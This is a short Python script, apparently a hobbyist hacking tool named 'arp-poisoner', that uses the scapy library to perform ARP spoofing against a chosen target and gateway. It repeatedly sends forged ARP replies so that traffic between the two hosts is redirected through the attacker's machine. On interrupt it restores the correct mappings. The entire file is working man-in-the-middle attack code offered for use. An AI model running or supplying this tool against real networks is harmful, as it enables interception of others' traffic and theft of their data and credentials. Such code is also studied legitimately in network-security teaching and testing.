# created by Mehmet Deniz Ozkahraman

import scapy.all as scapy
import time
import optparse

def user_input():
    parse_object = optparse.OptionParser()

    parse_object.add_option("-t","--target", dest="target_ip", help="Enter Target IP!")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Enter Gateway IP!")

    options = parse_object.parse_args()[0]

    if not options.target_ip:
        print("Enter Target IP!")

    if not options.gateway_ip:
        print("Enter Gateway IP!")

    return options


def get_mac_address(user_input):
    arp_request = scapy.ARP(pdst=user_input)

    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    combined_packet = broadcast_packet / arp_request

    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def arp_poisoning(target_ip, poisoned_ip):
    target_mac = get_mac_address(target_ip)

    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)

    scapy.send(arp_response, verbose=False)

def arp_poisoning_reset(fooled_ip, gateway_ip):
    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)

    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=gateway_ip, hwsrc=gateway_mac)

    scapy.send(arp_response, verbose=False, count=6)


print("""
by mdo //-
                                    _                           
  __ _ _ __ _ __        _ __   ___ (_)___  ___  _ __   ___ _ __ 
 / _` | '__| '_ \ _____| '_ \ / _ \| / __|/ _ \| '_ \ / _ \ '__| 
| (_| | |  | |_) |_____| |_) | (_) | \__ \ (_) | | | |  __/ |    
 \__,_|_|  | .__/      | .__/ \___/|_|___/\___/|_| |_|\___|_|    
           |_|         |_|                                        

""")


number = 0

user_ips = user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip


try:
    while True:
        arp_poisoning(user_target_ip, user_gateway_ip)
        arp_poisoning(user_gateway_ip,user_target_ip)

        number+=2

        print("\rSending packets " + str(number), end="")

        time.sleep(3)
except KeyboardInterrupt:
    print("\n Attack terminated and IP-MAC Address matches fixed.")
    arp_poisoning_reset(user_target_ip,user_gateway_ip)
    arp_poisoning_reset(user_gateway_ip, user_target_ip)


